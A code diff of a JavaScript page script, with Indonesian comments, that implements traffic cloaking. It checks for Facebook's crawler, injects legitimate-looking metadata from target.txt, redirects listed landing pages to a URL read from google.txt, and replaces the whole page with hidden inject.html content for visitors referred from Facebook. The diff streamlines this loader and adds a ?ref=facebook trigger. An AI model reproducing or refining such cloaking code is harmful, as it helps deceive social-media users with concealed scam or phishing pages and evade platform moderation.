@@ -1,17 +1,21 @@
 (function () {
-  const referrer = document.referrer; // Mendapatkan referer
-  const userAgent = navigator.userAgent; // Mendapatkan user-agent
-  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
-  const currentPath = location.pathname; // Mendapatkan path URL saat ini
-  const testing = true; // Flag untuk pengujian
+  const referrer = document.referrer;
+  const userAgent = navigator.userAgent;
+  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent);
+  const currentPath = location.pathname;
+  const testing = true; // Ubah ke false untuk mode produksi
 
   // Fungsi untuk membaca file eksternal
   const fetchFileContent = async (filePath) => {
-    const response = await fetch(filePath);
-    if (!response.ok) {
-      throw new Error(`Failed to fetch ${filePath}`);
+    try {
+      const response = await fetch(filePath, { cache: 'no-cache' });
+      if (!response.ok) throw new Error(`Failed to fetch ${filePath}`);
+      return response.text();
+    } catch (error) {
+      console.error(`Error fetching ${filePath}:`, error);
+      alert('Gagal memuat konten halaman, silakan coba lagi.');
+      return '';
     }
-    return response.text();
   };
 
   // Fungsi untuk menyisipkan metadata asli ke dalam DOM
@@ -19,121 +23,53 @@
     const parser = new DOMParser();
     const doc = parser.parseFromString(metadata, 'text/html');
 
-    // Sisipkan <title>
     const title = doc.querySelector('title');
-    if (title) {
-      document.title = title.textContent;
-    }
+    if (title) document.title = title.textContent;
 
-    // Sisipkan <meta> dan <link>
     const head = document.head;
     doc.querySelectorAll('meta, link').forEach((meta) => {
       head.appendChild(meta.cloneNode(true));
     });
   };
 
+  // Mendapatkan parameter ?ref=facebook dari URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const refFromFacebook = urlParams.get('ref') === 'facebook';
+
   // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
   Promise.all([
     fetchFileContent('/google.txt'),
     fetchFileContent('/target.txt'),
-    fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
-    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
+    fetchFileContent('/target.txt'),
+    fetchFileContent('/landingpage.txt'),
   ])
     .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
-      const landingPageList = landingPages.split('\n').map((page) => page.trim()); // Buat daftar halaman
+      const landingPageList = landingPages.split('\n').map((page) => page.trim());
 
       if (landingPageList.some((page) => currentPath.includes(page))) {
-        // Jika currentPath cocok dengan salah satu halaman di landingpage.txt
-        injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
-        location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
-      } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
-        // GitHub Pages optimized approach for loading inject.html
-        const loadInjectHTML = async () => {
-          try {
-            // Get the repository name from the URL for GitHub Pages path resolution
-            const pathSegments = window.location.pathname.split('/');
-            const repoName = pathSegments[1] === '' ? '' : '/' + pathSegments[1];
-            
-            // Construct the primary path for GitHub Pages
-            const injectPath = `${window.location.origin}${repoName}/inject.html?nocache=${Date.now()}`;
-            console.log('Attempting to fetch from:', injectPath);
-
-            // Fetch the inject.html content
-            const response = await fetch(injectPath, {
-              method: 'GET',
-              headers: {
-                'Cache-Control': 'no-cache, no-store, must-revalidate',
-                'Pragma': 'no-cache',
-              },
-            });
-
-            if (!response.ok) {
-              throw new Error(`Failed to fetch inject.html: ${response.status}`);
-            }
-
-            const html = await response.text();
-            if (!html || html.trim() === '') {
-              throw new Error('Fetched inject.html is empty');
-            }
-
-            console.log('Inject HTML successfully loaded');
-            processHTML(html);
-          } catch (error) {
-            console.error('Error loading inject.html:', error.message);
-            tryAlternativePath();
-          }
-        };
-
-        // Try alternative path if the first attempt fails
-        const tryAlternativePath = async () => {
-          try {
-            console.log('Trying alternative path for inject.html');
-            const fallbackPath = `./inject.html?nocache=${Date.now()}`;
-            const response = await fetch(fallbackPath, {
-              method: 'GET',
-              headers: {
-                'Cache-Control': 'no-cache, no-store, must-revalidate',
-                'Pragma': 'no-cache',
-              },
-            });
-
-            if (!response.ok) {
-              throw new Error(`Failed to fetch inject.html from fallback path: ${response.status}`);
-            }
-
-            const html = await response.text();
-            if (!html || html.trim() === '') {
-              throw new Error('Fetched inject.html from fallback path is empty');
-            }
-
-            console.log('Inject HTML loaded from alternative path');
-            processHTML(html);
-          } catch (error) {
-            console.error('All attempts to load inject.html failed:', error.message);
-            alert('Failed to load content. Please check your connection.');
-          }
-        };
-
-        // Process the HTML content once loaded
-        const processHTML = (html) => {
-          try {
-            // Replace document content
-            document.open();
-            document.write(html);
-            document.close();
-
-            // Inject metadata after DOM replacement
+        injectMetadata(originalHtml);
+        setTimeout(() => {
+          // Tambahkan parameter ?ref=facebook jika referer dari Facebook
+          const redirectUrl = `${googleUrl.trim()}?ref=facebook`;
+          location.href = redirectUrl;
+        }, 200);
+      } else if (testing || refFromFacebook || referrer.includes('facebook.com')) {
+        // Muat inject.html jika datang dari Facebook atau mode testing
+        fetch('/inject.html', { cache: 'no-cache' })
+          .then((response) => {
+            if (!response.ok) throw new Error('Failed to load inject.html');
+            return response.text();
+          })
+          .then((html) => {
             setTimeout(() => {
+              document.documentElement.innerHTML = html;
               injectMetadata(originalHtml);
-              console.log('Metadata injection complete');
-            }, 200); // Slight delay for slower browsers
-          } catch (e) {
-            console.error('Error processing HTML:', e);
-          }
-        };
-
-        // Start the loading process
-        loadInjectHTML();
+            }, 200);
+          })
+          .catch((err) => {
+            console.error('Error loading inject.html:', err);
+            alert('Gagal memuat halaman. Silakan coba lagi.');
+          });
       }
     })
     .catch((err) => console.error('Error loading URLs:', err));
